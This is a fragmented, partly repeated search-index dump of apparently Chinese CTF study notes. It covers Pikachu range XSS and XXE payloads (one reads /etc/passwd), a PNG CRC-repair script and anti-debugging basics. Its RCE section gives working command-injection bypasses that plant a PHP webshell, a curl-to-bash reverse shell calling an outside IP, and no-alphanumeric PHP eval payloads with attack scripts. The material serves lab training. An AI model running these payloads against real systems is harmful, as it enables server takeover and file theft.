根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#如下所示为常见的魔法函数"},{"categories":["web","wp"],"content":"\rUrl Redirect​ 不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。 ​ 如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生\"跳错对象\"的问题。 ​ url跳转比较直接的危害是: –\u003e钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站 注意查看每个超链接的具体内容： 尝试跳转至我的博客： 成功跳转： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#url-redirect"},{"categories":["web","wp"],"content":"\rxml external entity injection​ xml外部实体注入漏洞 ​ 攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。 ​ 在现在很多语言里用于解析xml的函数, 默认禁止解析外部实体内容, 从而就避免了此漏洞。以PHP为例, 在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xml-external-entity-injection"},{"categories":["web","wp"],"content":"\r先补一下基础知识：","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#先补一下基础知识"},{"categories":["web","wp"],"content":"\rjoker0xxx3师傅的笔记 第一部分：XML声明部分 \u003c?xml version=\"1.0\"?\u003e 第二部分：文档类型定义 DTD \u003c!DOCTYPE note[ \u003c!--定义此文档是note类型的文档--\u003e \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e \u003c!--外部实体声明--\u003e ]\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#返回主页httpswwwcnblogscomskinscustomimageslogogifhttpswwwcnblogscomjoker-vipjoker0xxx3httpswwwcnblogscomjoker-vip师傅的笔记"},{"categories":["web","wp"],"content":"\rjoker0xxx3师傅的笔记 第一部分：XML声明部分 \u003c?xml version=\"1.0\"?\u003e 第二部分：文档类型定义 DTD \u003c!DOCTYPE note[ \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e ]\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#第一部分xml声明部分"},{"categories":["web","wp"],"content":"\rjoker0xxx3师傅的笔记 第一部分：XML声明部分 \u003c?xml version=\"1.0\"?\u003e 第二部分：文档类型定义 DTD \u003c!DOCTYPE note[ \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e ]\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#第二部分文档类型定义-dtd"},{"categories":["web","wp"],"content":"\r第三部分：文档元素 \u003cnote\u003e \u003cto\u003eDave\u003c/to\u003e \u003cfrom\u003eTom\u003c/from\u003e \u003chead\u003eReminder\u003c/head\u003e \u003cbody\u003eYou are a good man\u003c/body\u003e \u003c/note\u003e ​ 其中，DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。 ① 内部申明DTD格式\u003c!DOCTYPE 根元素 [元素申明]\u003e ② 外部引用DTD格式\u003c!DOCTYPE 根元素 SYSTEM \"外部DTD的URI\"\u003e ③ 引用公共DTD格式\u003c!DOCTYPE 根元素 PUBLIC \"DTD标识名\" \"公共DTD的URI\"\u003e 外部实体引用 Payload \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY f SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cx\u003e\u0026f;\u003c/x\u003e 本题目是默认开启了LIBXML_NOENT 如果删掉LIBXML_NOENT则无法解析外部实体内容 xml外部引用支持file协议, 以及http, ftp等协议 我们通过构造一下代码，来读取网站根目录的相关文件 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY f SYSTEM \"file:///c:/windows/system.ini\"\u003e ]\u003e \u003cx\u003e\u0026f;\u003c/x\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:3","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#第三部分文档元素"},{"categories":["misc","notes"],"content":"一点png的基础和pngCRC 基础：用010editor打开该png分析其字节信息 前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的 chunk[0]段：◎从文件头往后，四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，该段格式是固定的 ◎之后的四个字节****49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示，该段格式也是固定的 ◎之后进入13位数据块，前8个字节00 00 05 A0 00 00 03 84中： 前四个字节00 00 05 A0（即为十进制的1366），代表该图片的宽，该段数据是由图片的实际宽决定的 后四个字节00 00 03 84（即为十进制的900），代表该图片的高，该段数据是由图片的实际高度决定的 这8个字节都属于13位数据块的内容，因此数据块应再向后数5个字节，即为00 00 05 A0 00 00 03 84 08 02 00 00 00 剩余的4位D8 2F 01 85为该png的CRC检验码，该段数据是由IDCH以及十三位数据块（即上文中的49 48 44 52 00 00 05 A0 00 00 03 84 08 02 00 00 00）计算得到的 绿色部分是IHDR数据, 里面的00 00 01 f4是宽, 00 00 01 af是高，红色部分是CRC32, 是根据绿色部分算出来的 有了之上的基础知识，再来看大部分png中CRC检验错误的出题思路： 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 网上的CRC修正python脚本： import binascii import struct import sys file = input(\"图片地址：\") fr = open(file,'rb').read() data = bytearray(fr[0x0c:0x1d]) crc32key = eval('0x'+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1]) #原来的代码: crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(\"b'\",'0x').replace(\"'\",'')) n = 4095 for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n): height = bytearray(struct.pack('\u003ei', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) \u0026 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb') fw.write(newpic) fw.close sys.exit() 为方便起见，.py文件最好和png文件处在同一文件夹 ","date":"2023-11-17","objectID":"/pngcrc/:0:0","series":null,"tags":["misc","notes"],"title":"pngCRC","uri":"/pngcrc/#"},{"categories":["misc","notes"],"content":"一点png的基础和pngCRC 基础：用010editor打开该png分析其字节信息 前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的 chunk[0]段：◎从文件头往后，四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，该段格式是固定的 ◎之后的四个字节****49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示，该段格式也是固定的 ◎之后进入13位数据块，前8个字节00 00 05 A0 00 00 03 84中： 前四个字节00 00 05 A0（即为十进制的1366），代表该图片的宽，该段数据是由图片的实际宽决定的 后四个字节00 00 03 84（即为十进制的900），代表该图片的高，该段数据是由图片的实际高度决定的 这8个字节都属于13位数据块的内容，因此数据块应再向后数5个字节，即为00 00 05 A0 00 00 03 84 08 02 00 00 00 剩余的4位D8 2F 01 85为该png的CRC检验码，该段数据是由IDCH以及十三位数据块（即上文中的49 48 44 52 00 00 05 A0 00 00 03 84 08 02 00 00 00）计算得到的 绿色部分是IHDR数据, 里面的00 00 01 f4是宽, 00 00 01 af是高，红色部分是CRC32, 是根据绿色部分算出来的 有了之上的基础知识，再来看大部分png中CRC检验错误的出题思路： 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 网上的CRC修正python脚本： import binascii import struct import sys file = input(\"图片地址：\") fr = open(file,'rb').read() data = bytearray(fr[0x0c:0x1d]) crc32key = eval('0x'+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1]) #原来的代码: crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(\"b'\",'0x').replace(\"'\",'')) n = 4095 for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n): height = bytearray(struct.pack('\u003ei', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) \u0026 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb') fw.write(newpic) fw.close sys.exit() 为方便起见，.py文件最好和png文件处在同一文件夹 ","date":"2023-11-17","objectID":"/pngcrc/:0:0","series":null,"tags":["misc","notes"],"title":"pngCRC","uri":"/pngcrc/#chunk0段"},{"categories":["web","manual"],"content":"进阶版rce_payload ","date":"2023-11-17","objectID":"/rce_advanced/:0:0","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#"},{"categories":["web","manual"],"content":"\r字符数量限制bypass题目限制了命令的长度，只能7个字符。 \u003c?php $sandbox = dirname(__FILE__).'/sandbox_' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); mkdir($sandbox,0755,true); chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 7) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); ?\u003e 我们可以利用Linux命令特性，来写入一句话木马 每次提交不超过7个字符的命令，写入一句话木马的执行语句到文件名，然后通过sh a ls -t，利用文件名组成写入一句话木马的命令 要写入的一句话木马： \u003c?php eval($_GET[1]); base64编码后: PD9waHAgZXZhbCgkX0dFVFsxXSk7 最终需要被执行的语句： echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d\u003e1.php 然后将语句分拆，输出为文件名： \u003ehp \u003e1.p\\\\ \u003ed\\\u003e\\\\ \u003e\\ -\\\\ \u003ee64\\\\ \u003ebas\\\\ \u003e7\\|\\\\ \u003eXSk\\\\ \u003eFsx\\\\ \u003edFV\\\\ \u003ekX0\\\\ \u003ebCg\\\\ \u003eXZh\\\\ \u003eAgZ\\\\ \u003ewaH\\\\ \u003ePD9\\\\ \u003eo\\ \\\\ \u003eech\\\\ ls -t\u003e0 sh 0 用python打payload，把上面的payload写入execpayload.txt里面 import requests url = \"http://xxxxx/index.php?cmd={0}\" print(\"[+]start attack!!!\") with open(\"execpayload.txt\", \"r\") as f: for i in f: print(\"[*]\" + url.format(i.strip())) requests.get(url.format(i.strip())) 最终会在目录下生成1.php，里面就是一句话木马 如果是五位字符限制，则最后用 \u003els\\\\ ls\u003ea \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003e0 ls\u003e\u003ea sh a 四位： \u003ef\\\u003e \u003eht- \u003esl \u003edir *\u003ev \u003erev *v\u003e0 cat 0 这里是利用Linux的命令特性，起初在windows下搭建的环境需要修改成windows的终端命令 ","date":"2023-11-17","objectID":"/rce_advanced/:0:1","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#字符数量限制bypass"},{"categories":["web","manual"],"content":"\r无回显rce无回显rce是远程服务器上执行命令后，前段不会显示执行结果。这个时候需要使用curl或反弹shell进行绕过 \u003c?php if(isset($_GET['c'])){ $c=$_GET['c']; system($c.\" \u003e/dev/null 2\u003e\u00261\"); }else{ highlight_file(__FILE__); } 无回显可以通过增加参数sleep进行判断 ls|sleep 10 如返回时间有明显差异，则代表命令执行成功。 对于无参数RCE，可以使用反弹shell ","date":"2023-11-17","objectID":"/rce_advanced/:0:2","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#无回显rce"},{"categories":["web","manual"],"content":"\r字符数量限制bypass2curl反弹shell：利用curl的反弹shell技巧，构造反弹shell语句，利用curl 访问目标地址|hash，执行目标地址上的反弹shell语句。 例题： \u003c?php error_reporting(E_ALL); $sandbox = dirname(__FILE__).'/sandbox_' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); mkdir($sandbox,0755,true); chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 6) { exec($_GET['cmd']); } else if (isset($_GET['reset'])) { exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); 利用vps，搭建80服务，存入反弹shell的语句，效果如下： 访问：http://81.71.84.61/ 显示：bash -i \u003e\u0026 /dev/tcp/219.152.63.100/8000 0\u003e\u00261 利用linux特性写入一句话木马，由于限制字符数量限制，此处分开两部分执行。 用于接收shell的机器要开启端口监听 nc -lv 8000 第一部分： \u003els\\\\ ls\u003e_ \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003ey ls\u003e\u003e_ 此部分主要是分两段，写入文件_中。首先写入ls字符，然后追加写入-t \u003ey，这样执行sh _，即执行ls -t \u003ey。此语句等于0x09的ls -t\u003e0 第二部分： 构造curl 81.71.84.61|bash（curl访问这个地址即返回bash -i \u003e\u0026 /dev/tcp/219.152.63.100/8000 0\u003e\u00261这句话），从而执行反弹shell \"\u003ebash\", \"\u003e\\|\\\\\", \"\u003e61\\\\\", \"\u003e84.\\\\\", \"\u003e71.\\\\\", \"\u003e81.\\\\\", \"\u003e\\ \\\\\", \"\u003erl\\\\\", \"\u003ecu\\\\\" 由于有字符限制，所以按照上述拆分。 最后，执行sh _，然后执行sh y 即可 具体python代码如下： import requests baseurl = \"http://81.71.84.61:50002/?cmd=\" reset = \"http://81.71.84.61:50002/?reset\" s = requests.session() s.get(reset) # 将ls -t 写入文件_ list=[ \"\u003els\\\\\", \"ls\u003e_\", \"\u003e\\ \\\\\", \"\u003e-t\\\\\", \"\u003e\\\u003ey\", \"ls\u003e\u003e_\" ] # curl 120.79.33.253|bash # curl 219.152.63.100|bash # curl 81.71.84.61|bash list2=[ \"\u003ebash\", \"\u003e\\|\\\\\", \"\u003e61\\\\\", \"\u003e84.\\\\\", \"\u003e71.\\\\\", \"\u003e81.\\\\\", \"\u003e\\ \\\\\", \"\u003erl\\\\\", \"\u003ecu\\\\\" ] for i in list: url = baseurl+str(i) s.get(url) for j in list2: url = baseurl+str(j) s.get(url) s.get(baseurl+\"sh _\") s.get(baseurl+\"sh y\") #s.get(reset) 效果如下： [root@gr8oqhchd ~]# nc -lv 8000 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::8000 Ncat: Listening on 0.0.0.0:8000 Ncat: Connection from 81.71.84.61. Ncat: Connection from 81.71.84.61:43998. bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@314b51:~/html/sandbox_92f06c44fa329edc79eafc1eb$ ls / ls / bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www-data@314b51:~/html/sandbox_92f06c44fa329edc79eafc1eb$ ","date":"2023-11-17","objectID":"/rce_advanced/:0:3","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#字符数量限制bypass2"},{"categories":["web","manual"],"content":"\r无字母数字rce以下三种方法可以用来解决类似这种无字母数字rce \u003c?php highlight_file(__FILE__); $code = $_POST['code']; if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"hacker!\"); } @eval($code); ?\u003e ","date":"2023-11-17","objectID":"/rce_advanced/:1:0","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#无字母数字rce"},{"categories":["web","manual"],"content":"\r异域构造 $__=(\"#\"^\"|\"); // _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"{\"^\"/\"); // _POST $$__[_]($$__[__]); // $_POST[_]($_POST[__]); 随后合并并编码得到： %24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B 搭建本地环境进行测试 由于本地是Windows环境，所以执行的命令是dir payload： code=%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B\u0026_=system\u0026__=dir 我们可以通过脚本来实现构造 import re import requests import urllib from sys import * import os a=[] ans1=\"\" ans2=\"\" for i in range(0,256): #设置i的范围 c=chr(i) #将i转换成ascii对应的字符，并赋值给c tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-',c,re.I) #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符 if(tmp): continue #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可 else: a.append(i) #在数组中增加i，这些就是未被系统过滤掉的字符 # eval(\"echo($c);\"); mya=\"system\" #函数名 这里修改！ myb=\"dir\" #参数 def myfun(k,my): #自定义函数 global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错 global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错 for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 for j in range(i,len(a)): #在上个循环的条件下设置j的范围 if(a[i]^a[j]==ord(my[k])): ans1+=chr(a[i]) #ans1=ans1+chr(a[i]) ans2+=chr(a[j]) #ans2=ans2+chr(a[j]) return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符 for x in range(0,len(mya)): #设置k的范围 myfun(x,mya)#引用自定义的函数 data1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1等于传入的命令,\"+ans1+\"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值 print(data1) ans1=\"\"#对ans1进行重新赋值 ans2=\"\"#对ans2进行重新赋值 for k in range(0,len(myb)):#设置k的范围为(0,len(myb)) myfun(k,myb)#再次引用自定义函数 data2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\" print(data2) 构造system(‘dir’); payload: code=('%0C%05%0C%08%05%0D'^'%7F%7C%7F%7C%60%60')(\"%04%09%0D\"^\"%60%60%7F\"); ","date":"2023-11-17","objectID":"/rce_advanced/:1:1","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#异域构造"},{"categories":["web","manual"],"content":"\r自增构造 \u003c?php $_=[].'';//Array $_=$_[''=='$'];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_='_'.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) 随后可以尝试给_和__进行GET传参，我们把换行去掉，然后进行一次URL编码（中间件会解码一次），所以我们构造的payload先变成这样： $_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]); 编码之后 %24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B 然后传参\u0026_=system\u0026__=dir; 如果是POST传参方式也可以这样： 在自增中，可以通过特殊字符构造出字符串的有以下几种方式 [].'' //Array (0/0).'' //NAN (1/0).'' //INF 如果ban了数字： a/a //NAN _/_ //NAN INF //1/a ","date":"2023-11-17","objectID":"/rce_advanced/:1:2","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#自增构造"},{"categories":["web","manual"],"content":"\r取反构造利用不可见字符，进行两次取反,得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。 这里的话利用一个php脚本即可获取我们想要的字符 \u003c?php $ans1='system';//函数名 $ans2='dir';//命令 $data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system $data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir echo ('('.$data1.')'.'('.$data2.')'.';'); 本地测试 然后 参考： CTF随笔-RCE进阶 ","date":"2023-11-17","objectID":"/rce_advanced/:1:3","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#取反构造"},{"categories":["Reverse","notes"],"content":"reverse反调试基础 ","date":"2023-11-17","objectID":"/reverse-antidbg/:0:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#"},{"categories":["Reverse","notes"],"content":"\r关于反调试分为静态反调试和动态反调试 ","date":"2023-11-17","objectID":"/reverse-antidbg/:0:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#关于反调试"},{"categories":["Reverse","notes"],"content":"\r调试常用的工具IDA Pro Ollydbg peid(查壳工具) ","date":"2023-11-17","objectID":"/reverse-antidbg/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#调试常用的工具"},{"categories":["Reverse","notes"],"content":"\r一.栈指针平衡\rESP寄存器指向当前栈顶元素的地址，是栈操作的重要寄存器。 EBP寄存器通常用于指向当前函数的基址（起始地址）或堆栈帧的基址。 当我们用IDA进行静态分析，用F5进行反编译的时候，会出现如下这种报错： sp：stack pointer 栈指针 为解决这个问题，我们首先要清除是什么地方导致栈指针不平衡，根据报错： 找到这个地方之后，要进行栈指针分析，此时要设置一下IDA，让其显示栈指针Options-General-Disassembly-\"Stack pointer\" 栈的生命周期结束后，ESP和EBP寄存器的值会恢复到它们在函数调用前的值 然而，我们看到的这个pop指令后的栈指针与入栈的栈指针不一致 这就引起了栈指针不平衡，因此我们需要手动调节栈指针，让其恢复平衡 Attention：每条语句前的栈指针是这条语句未执行的栈指针 我们在IDA中使用Alt+k可以修改栈指针 修改后的值为：0X21E-0X4 = 0X21A (然而，根据大佬在博客中的解释，栈指针不平衡可能是IDA的一个漏洞) IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注\"sp-analysis failed\"。一般编程中，不同的函数调用约定(如stdcall\u0026_cdcel call)可能会出现这种情况；另外，为了实现代码保护而加入代码混淆(特指用push/push+ret实现函数调用)技术也会出现这种情况。 我看的这篇文章是2019年发布的，或许当年的IDA还有这方面缺陷，然而我下载了其博客中的附件进行复现的时候，发现并没有其博客中出现的问题，可以直接进行反编译，或许是新版本的IDA进行了自动修复 ","date":"2023-11-17","objectID":"/reverse-antidbg/:1:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#一栈指针平衡"},{"categories":["Reverse","notes"],"content":"\r二.花指令","date":"2023-11-17","objectID":"/reverse-antidbg/:2:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#二花指令"},{"categories":["Reverse","notes"],"content":"\r0x1 花指令概述​ 在正常的代码流程中通过内联汇编或者插入机器码的方式来干扰指令执行的顺序，从而影响反汇编引擎的工作，导致反汇编工具难以正确地识别代码 ​ 是反静态调试的一种手段，从而加大逆向分析难度 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x1-花指令概述"},{"categories":["Reverse","notes"],"content":"\r0x2 花指令又是怎样影响栈指针的我们可以写一个简单的花指令，来分析其如何影响栈指针的 asm指令的作用：用于调用内联汇编程序，并且可在C或C++语句合法时出现，asm后跟一个程序指令集、一组括在大括号中的指令集或者至少一堆空大括号 emit指令的作用： 编译器不认识的指令，拆成机器码来写。 插入垃圾字节来反跟踪，又称花指令。 用emit就是在当前位置直接插入数据（实际上是指令），一般是用来直接插入汇编里面没有的特殊指令，多数指令可以用asm内嵌汇编来做，没有必要用emit来做，除非你不想让其它人看懂你的代码。 将改程序编译成exe，然后用IDA进行反编译，之后双击访问func2();,产生栈指针不平衡报错，以此可以达到反跟踪的目的 在编程语言中，通常以一个下划线开头的函数或变量名表示该函数或变量是库或系统的内部实现，不应该在用户代码中直接使用。这种命名约定通常被称为“前缀保留”。 有些编程语言还使用了双下划线前缀来表示特殊含义，例如： attribute：在C和C++中，__attribute__关键字用于指定变量或函数的属性，例如对齐方式、强制inline等。 __init和__exit：在Linux内核中，这些函数是内核模块初始化和清理函数的标准名称。 需要注意的是，使用双下划线前缀是非标准的命名约定，因此在编写代码时应该尽可能避免使用这种方式，以免与标准库或系统库的命名冲突。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x2-花指令又是怎样影响栈指针的"},{"categories":["Reverse","notes"],"content":"\r0x3 花指令分类\r可执行花指令​ 1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。 ​ 2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。 不可执行花指令​ 1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx). ​ 2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x3-花指令分类"},{"categories":["Reverse","notes"],"content":"\r0x3 花指令分类\r可执行花指令​ 1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。 ​ 2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。 不可执行花指令​ 1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx). ​ 2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#可执行花指令"},{"categories":["Reverse","notes"],"content":"\r0x3 花指令分类\r可执行花指令​ 1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。 ​ 2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。 不可执行花指令​ 1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx). ​ 